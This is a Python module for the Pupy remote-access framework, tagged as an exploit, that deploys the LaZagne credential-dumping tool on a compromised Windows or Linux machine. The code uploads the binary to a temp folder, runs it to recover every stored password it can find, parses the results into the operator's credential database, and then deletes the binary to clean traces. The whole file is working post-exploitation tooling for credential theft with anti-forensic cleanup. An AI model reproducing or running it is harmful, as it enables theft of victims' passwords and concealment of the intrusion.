# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
import tempfile
import subprocess
import os.path

__class_name__="LaZagne"

@config(cat="exploit")
class LaZagne(PupyModule):
    """ 
        execute LaZagne (Windows / Linux)
    """
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="lazagne", description=self.__doc__)

    def run(self, args):
        platform=self.client.desc["platform"]
        isWindows = True
        if "Windows" in platform:
            lazagne_path = self.client.pupsrv.config.get("lazagne","win")
        elif "Linux" in platform:
            isWindows = False
            if "64" in self.client.desc["os_arch"]:
                lazagne_path = self.client.pupsrv.config.get("lazagne","linux_64")
            else:
                lazagne_path = self.client.pupsrv.config.get("lazagne","linux_32")
        else:
            self.error("Platform not supported")
            return

        if not os.path.isfile(lazagne_path):
            self.error("laZagne exe %s not found ! please edit laZagne section in pupy.conf"%lazagne_path)
            self.error('Find releases on github: https://github.com/AlessandroZ/LaZagne/releases')
            return

        tf = tempfile.NamedTemporaryFile()
        dst = tf.name
        if isWindows:
            remoteTempFolder = self.client.conn.modules['os.path'].expandvars("%TEMP%")
            tfName = tf.name.split(os.sep)
            tfName = tfName[len(tfName)-1] + '.exe'
            dst = self.client.conn.modules['os.path'].join(remoteTempFolder, tfName)
        tf.file.close()

        self.success("Uploading laZagne to: %s" % dst)
        upload(self.client.conn, lazagne_path, dst)

        if not isWindows:
            self.success("Adding execution permission")
            cmd = ["chmod", "+x", dst]
            output = self.client.conn.modules.subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

        self.success("Executing")
        cmd = [dst, "all"]
        output = self.client.conn.modules.subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        self.success("%s" % output)
        
        creds = self.parse_output(output)
        db = Credentials()
        db.add(creds)
        self.success("Passwords stored on the database")
        
        self.success("Cleaning traces")
        self.client.conn.modules['os'].remove(dst)

    def parse_output(self, output):
        creds = []
        toSave = False
        ishashes = False
        cpt = 0
        for line in output.split('\n'):
            if not toSave:
                if "##########" in line:
                    user='%s' % line.replace('##########', '').split(':')[1].strip()

                if "---------" in line:
                    category='%s' % line.replace('-', '').strip()

                if " found !!!" in line:
                    toSave = True
                    cred = {}
            else:
                if not line or line == '\r':
                    if ishashes:
                        cpt+=1
                    if cpt > 1 or not ishashes:
                        toSave = False
                        ishashes = False
                        if cred:
                            cred['Tool']="LaZagne"
                            cred['System user'] = user
                            cred['Category'] = category
                            creds.append(cred)
                else:
                    # not store hashes => creddump already does it
                    if not ishashes:
                        if "hashes: " in line:
                            ishashes = True
                            cpt = 0
                        else:
                            try:
                                key, value = line.split(':', 1)
                                cred[key] = value.strip()
                            except:
                                pass                    
        return creds